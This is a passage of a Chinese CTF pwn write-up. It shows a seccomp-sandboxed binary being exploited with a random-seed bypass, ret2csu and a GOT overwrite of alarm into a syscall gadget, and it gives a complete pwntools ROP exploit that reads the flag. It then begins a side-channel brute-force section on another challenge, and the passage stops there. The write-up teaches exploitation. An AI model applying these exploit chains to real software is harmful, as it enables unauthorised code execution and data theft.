 <span class="mi">0005</span><span class="o">:</span> <span class="mi">0</span><span class="n">x06</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
</pre></div>
<h4 data-content="1" id="a48301d7ccf421e39ecb874ec0960712">ida</h4>
<div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="nf">main</span><span class="o">(</span><span class="n">int</span> <span class="n">a1</span><span class="o">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">a2</span><span class="o">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">a3</span><span class="o">)</span>
<span class="o">{</span>
  <span class="n">setvbuf</span><span class="o">(</span><span class="n">stdin</span><span class="o">,</span> <span class="mi">0</span><span class="n">LL</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="mi">0</span><span class="n">LL</span><span class="o">);</span>
  <span class="n">setvbuf</span><span class="o">(</span><span class="n">stdout</span><span class="o">,</span> <span class="mi">0</span><span class="n">LL</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="mi">0</span><span class="n">LL</span><span class="o">);</span>
  <span class="n">setvbuf</span><span class="o">(</span><span class="n">stderr</span><span class="o">,</span> <span class="mi">0</span><span class="n">LL</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="mi">0</span><span class="n">LL</span><span class="o">);</span>
  <span class="n">sub_4011F6</span><span class="o">();</span>
  <span class="n">alarm</span><span class="o">(</span><span class="mi">0</span><span class="n">x50u</span><span class="o">);</span>
  <span class="n">sub_401332</span><span class="o">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="n">LL</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>没有puts函数无法泄露libc，但是存在一个alarm函数（留意一下）</p>
<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="nf">sub_401332</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>

  <span class="n">srand</span><span class="p">(</span><span class="mh">0x39u</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">sub_4012D0</span><span class="p">();</span>
    <span class="n">v1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">40</span> <span class="o">+</span> <span class="mi">61</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">!=</span> <span class="n">v1</span> <span class="p">)</span>
      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">sub_40130D</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>
<p>前面就是一个随机数绕过</p>
<div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">3</span><span class="p">):</span>
       <span class="n">k</span> <span class="o">=</span> <span class="n">libcc</span><span class="o">.</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span> <span class="mi">40</span> <span class="o">+</span> <span class="mi">61</span> 
       <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</pre></div>
<p>可以利用的gadget</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240822182241-767fea12-6070-1.png"/><br/>
可以看到没有rdx相关gadget，也没有libc地址</p>
<p>因此考虑ret2csu控制rdx的值<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240822182251-7cce3eaa-6070-1.png"/></p>
<h4 data-content="1" id="76e4f6c08aec4690e6bf982c24308ecd">思路</h4>
<p>开启了沙箱，只能通过构造orw的方式读取flag，</p>
<p>不存在puts函数无法泄露libc_base</p>
<p>修改alarm的got表为syscall的地址</p>
<p>构造rop拿到shell</p>
<h4 data-content="1" id="bbb08692ad1842a21570aacc282ab8e6">过程</h4>
<p>查找一下alarm的got地址</p>
<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">got</span>
<span class="n">Filtering</span> <span class="n">out</span> <span class="n">read</span><span class="o">-</span><span class="n">only</span> <span class="n">entries</span> <span class="p">(</span><span class="n">display</span> <span class="n">them</span> <span class="k">with</span> <span class="o">-</span><span class="n">r</span> <span class="ow">or</span> <span class="o">--</span><span class="n">show</span><span class="o">-</span><span class="n">readonly</span><span class="p">)</span>

<span class="n">State</span> <span class="n">of</span> <span class="n">the</span> <span class="n">GOT</span> <span class="n">of</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">jinxi</span><span class="o">/</span><span class="err">桌面</span><span class="o">/</span><span class="err">黄河流域</span><span class="o">/</span><span class="n">pwn</span><span class="p">:</span>
<span class="n">GOT</span> <span class="n">protection</span><span class="p">:</span> <span class="n">Partial</span> <span class="n">RELRO</span> <span class="o">|</span> <span class="n">Found</span> <span class="mi">7</span> <span class="n">GOT</span> <span class="n">entries</span> <span class="n">passing</span> <span class="n">the</span> <span class="nb">filter</span>
<span class="p">[</span><span class="mh">0x404018</span><span class="p">]</span> <span class="n">alarm</span><span class="nd">@GLIBC_2.2.5</span> <span class="o">-&gt;</span> <span class="mh">0x7ffff7eb7d90</span> <span class="p">(</span><span class="n">alarm</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">endbr64</span> 
<span class="p">[</span><span class="mh">0x404020</span><span class="p">]</span> <span class="n">read</span><span class="nd">@GLIBC_2.2.5</span> <span class="o">-&gt;</span> <span class="mh">0x7ffff7ee31e0</span> <span class="p">(</span><span class="n">read</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">endbr64</span> 
<span class="p">[</span><span class="mh">0x404028</span><span class="p">]</span> <span class="n">srand</span><span class="nd">@GLIBC_2.2.5</span> <span class="o">-&gt;</span> <span class="mh">0x7ffff7e1c5c0</span> <span class="p">(</span><span class="n">srandom</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">endbr64</span> 
<span class="p">[</span><span class="mh">0x404030</span><span class="p">]</span> <span class="n">prctl</span><span class="nd">@GLIBC_2.2.5</span> <span class="o">-&gt;</span> <span class="mh">0x7ffff7ef4f50</span> <span class="p">(</span><span class="n">prctl</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">endbr64</span> 
<span class="p">[</span><span class="mh">0x404038</span><span class="p">]</span> <span class="n">setvbuf</span><span class="nd">@GLIBC_2.2.5</span> <span class="o">-&gt;</span> <span class="mh">0x7ffff7e59ce0</span> <span class="p">(</span><span class="n">setvbuf</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">endbr64</span> 
<span class="p">[</span><span class="mh">0x404040</span><span class="p">]</span> <span class="n">atoi</span><span class="nd">@GLIBC_2.2.5</span> <span class="o">-&gt;</span> <span class="mh">0x401080</span> <span class="err">◂—</span> <span class="n">endbr64</span> 
<span class="p">[</span><span class="mh">0x404048</span><span class="p">]</span> <span class="n">rand</span><span class="nd">@GLIBC_2.2.5</span> <span class="o">-&gt;</span> <span class="mh">0x401090</span> <span class="err">◂—</span> <span class="n">endbr64</span>
</pre></div>
<p>alarm在libc里面的内容里面有syscall</p>
<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">i</span> <span class="mh">0x00007ffff7eb7d90</span>
   <span class="mh">0x7ffff7eb7d90</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">endbr64</span> 
   <span class="mh">0x7ffff7eb7d94</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x25</span>
   <span class="mh">0x7ffff7eb7d99</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">syscall</span>        <span class="c1">######修改alarm为syscall</span>
   <span class="mh">0x7ffff7eb7d9b</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;</span><span class="p">:</span>   <span class="nb">cmp</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0xfffffffffffff001</span>
   <span class="mh">0x7ffff7eb7da1</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jae</span>    <span class="mh">0x7ffff7eb7da4</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>
   <span class="mh">0x7ffff7eb7da3</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>    
   <span class="mh">0x7ffff7eb7da4</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x1090c5</span><span class="p">]</span>        <span class="c1"># 0x7ffff7fc0e70</span>
   <span class="mh">0x7ffff7eb7dab</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">neg</span>    <span class="n">eax</span>
   <span class="mh">0x7ffff7eb7dad</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">fs</span><span class="p">:[</span><span class="n">rcx</span><span class="p">],</span><span class="n">eax</span>
   <span class="mh">0x7ffff7eb7db0</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span>   <span class="ow">or</span>     <span class="n">rax</span><span class="p">,</span><span class="mh">0xffffffffffffffff</span>
   <span class="mh">0x7ffff7eb7db4</span> <span class="o">&lt;</span><span class="n">alarm</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>    
   <span class="mh">0x7ffff7eb7db5</span><span class="p">:</span>  <span class="n">nop</span>    <span class="n">WORD</span> <span class="n">PTR</span> <span class="n">cs</span><span class="p">:[</span><span class="n">rax</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
   <span class="mh">0x7ffff7eb7dbf</span><span class="p">:</span>  <span class="n">nop</span>
   <span class="mh">0x7ffff7eb7dc0</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">endbr64</span> 
   <span class="mh">0x7ffff7eb7dc4</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">rbp</span>
   <span class="mh">0x7ffff7eb7dc5</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">rbx</span>
   <span class="mh">0x7ffff7eb7dc6</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x28</span>
   <span class="mh">0x7ffff7eb7dca</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x10909f</span><span class="p">]</span>        <span class="c1"># 0x7ffff7fc0e70</span>
   <span class="mh">0x7ffff7eb7dd1</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">fs</span><span class="p">:</span><span class="mh">0x28</span>
   <span class="mh">0x7ffff7eb7dda</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="n">rax</span>
</pre></div>
<p>因此可以构造read修改alarm的got为syscall的地址</p>
<div class="highlight"><pre><span></span><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">alarm</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'b'</span>\<span class="n">x99</span><span class="s1">''</span><span class="p">)</span>
</pre></div>
<h4 data-content="1" id="c3ca938f34d8838917b1b09b52ff3413">exp</h4>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">cdll</span>
<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc.so.6"</span><span class="p">)</span>
<span class="n">libcc</span> <span class="o">=</span> <span class="n">cdll</span><span class="o">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s1">'./libc.so.6'</span><span class="p">)</span>
<span class="n">libcc</span><span class="o">.</span><span class="n">srand</span><span class="p">(</span><span class="mh">0x39</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">3</span><span class="p">):</span>
       <span class="n">k</span> <span class="o">=</span> <span class="n">libcc</span><span class="o">.</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span> <span class="mi">40</span> <span class="o">+</span> <span class="mi">61</span> 
       <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">read</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
<span class="n">alarm</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'alarm'</span><span class="p">]</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4014a3</span>
<span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x4014a1</span>
<span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x401308</span>
<span class="n">csu_1</span> <span class="o">=</span> <span class="mh">0x40149A</span>
<span class="n">csu_2</span> <span class="o">=</span> <span class="mh">0x401480</span>
<span class="n">vuln</span> <span class="o">=</span> <span class="mh">0x40130D</span>
<span class="n">bss</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'./flag</span><span class="se">\x00\x00</span><span class="s1">'</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">alarm</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
<span class="c1">#open</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">alarm</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_2</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mh">0x38</span>
<span class="c1">#read:</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">alarm</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_2</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mh">0x38</span>
<span class="c1">#write:</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">alarm</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_2</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x99</span><span class="s1">'</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="63ac3c1ab52d255223c82143ded05879">测信道爆破</h3>
<h4 data-content="1" id="2bd7c1bffe2e65a4669f201dd62ef067">2021-蓝帽杯初赛-slient</h4>
<p>程序在禁用了execve系统调用后，同时关闭了标准输出流（write）后，才有必要使用侧信道爆破</p>
<div class="highlight"><pre><span></span><span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
<span class="o">=================================</span>
 <span class="mi">0000</span><span class="o">:</span> <span class="mi">0</span><span class="n">x20</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
 <span class="mi">0001</span><span class="o">:</span> <span class="mi">0</span><span class="n">x15</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x06</span> <span class="mi">0</span><span class="n">xc000003e</span>  <span class="k">if</span> <span class="o">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="o">)</span> <span class="n">goto</span> <span class="mi">0008</span>
 <span class="mi">0002</span><span class="o">:</span> <span class="mi">0</span><span class="n">x20</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mi">0003</span><span class="o">:</span> <span class="mi">0</span><span class="n">x35</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x01</span> <span class="mi">0</span><span class="n">x40000000</span>  <span class="k">if</span> <span class="o">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="n">x40000000</span><span class="o">)</span> <span class="n">goto</span> <span class="mi">0005</span>
 <span class="mi">0004</span><span class="o">:</span> <span class="mi">0</span><span class="n">x15</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x03</span> <span class="mi">0</span><span class="n">xffffffff</span>  <span class="k">if</span> <span class="o">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mi">0</span><span class="n">xffffffff</span><span class="o">)</span> <span class="n">goto</span> <span class="mi">0008</span>
 <span class="mi">0005</span><span class="o">:</span> <span class="mi">0</span><span class="n">x15</span> <span class="mi">0</span><span class="n">x01</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00000000</span>  <span class="k">if</span> <span class="o">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">read</span><span class="o">)</span> <span class="n">goto</span> <span class="mi">0007</span>
 <span class="mi">0006</span><span class="o">:</span> <span class="mi">0</span><span class="n">x15</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x01</span> <span class="mi">0</span><span class="n">x00000002</span>  <span class="k">if</span> <span class="o">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">open</span><span class="o">)</span> <span class="n">goto</span> <span class="mi">0008</span>
 <span class="mi">0007</span><span class="o">:</span> <span class="mi">0</span><span class="n">x06</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mi">0008</span><span class="o">:</span> <span class="mi">0</span><span class="n">x06</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
</pre></div>
<p>本题只允许read和open通过，因此可以进行单个字节的对比爆破，读取flag，随后单字节爆破</p>
<p>ida</p>
<div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="n">main</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="n">eax</span>
  <span class="n">__int128</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="n">xmm0</span>
  <span class="n">__int128</span> <span class="n">v5</span><span class="p">;</span> <span class="o">//</span> <span class="n">xmm1</span>
  <span class="n">__int128</span> <span class="n">v6</span><span class="p">;</span> <span class="o">//</span> <span class="n">xmm2</span>
  <span class="n">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">48</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">68</span><span class="n">h</span><span class="p">]</span>
  <span class="n">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">50</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">60</span><span class="n">h</span><span class="p">]</span>
  <span class="n">__int128</span> <span class="n">buf</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">60</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">50</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
  <span class="n">__int128</span> <span class="n">v11</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">70</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">40</span><span class="n">h</span><span class="p">]</span>
  <span class="n">__int128</span> <span class="n">v12</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">80</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">30</span><span class="n">h</span><span class="p">]</span>
  <span class="n">__int128</span> <span class="n">v13</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">90</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">20</span><span class="n">h</span><span class="p">]</span>
